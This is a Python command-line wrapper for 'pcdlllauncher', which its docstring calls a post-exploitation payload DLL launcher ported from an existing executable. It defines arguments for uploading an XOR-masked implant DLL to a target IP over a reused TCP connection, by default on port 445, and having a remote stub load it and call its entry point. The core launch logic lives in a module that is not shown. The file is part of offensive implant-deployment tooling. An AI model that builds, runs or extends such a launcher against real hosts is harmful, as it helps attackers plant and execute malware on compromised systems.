"""pcdlllauncher — post-exploitation payload DLL launcher.

Python port of Pcdlllauncher-2.3.1.exe. Reuses an established TCP connection
(ConnectedTcp) to a target and uploads an implant DLL (NRV-compressed and
XOR-masked), then instructs the remote stub to LoadLibrary / GetProcAddress /
call the entry point (LPEntryName)."
"""
from . import pcdlllauncher


def pcdlllauncher_handle(args):
    return pcdlllauncher.run(
        target_ip=args.target_ip,
        target_port=args.target_port,
        connected_tcp=args.connected_tcp,
        implant_filename=args.implant_filename,
        lp_filename=args.lp_filename,
        lp_entry_name=args.lp_entry_name,
        xor_mask=args.xor_mask,
        target_os_arch=args.target_os_arch,
        network_timeout=args.network_timeout,
        pc_behavior=args.pc_behavior,
    )


def reg_subparser(subparsers):
    p = subparsers.add_parser("pcdlllauncher", help="后利用 DLL 启动器 (Pcdlllauncher)", description=__doc__)
    p.add_argument("target_ip")
    p.add_argument("-P", "--target-port", type=int, default=445)
    p.add_argument("--connected-tcp", help="已建立的 TCP 连接描述（复用）")
    p.add_argument("-i", "--implant-filename", required=True, help="要上传的 implant DLL 路径")
    p.add_argument("--lp-filename", help="remote LP filename")
    p.add_argument("--lp-entry-name", default="", help="入口导出名")
    p.add_argument("--xor-mask", type=int, default=0)
    p.add_argument("--target-os-arch", choices=["x86", "x64"], default="x86")
    p.add_argument("--network-timeout", type=float, default=30.0)
    p.add_argument("--pc-behavior", choices=["Raw Payload", "Encoded Payload"], default="Raw Payload")
    p.set_defaults(func=pcdlllauncher_handle)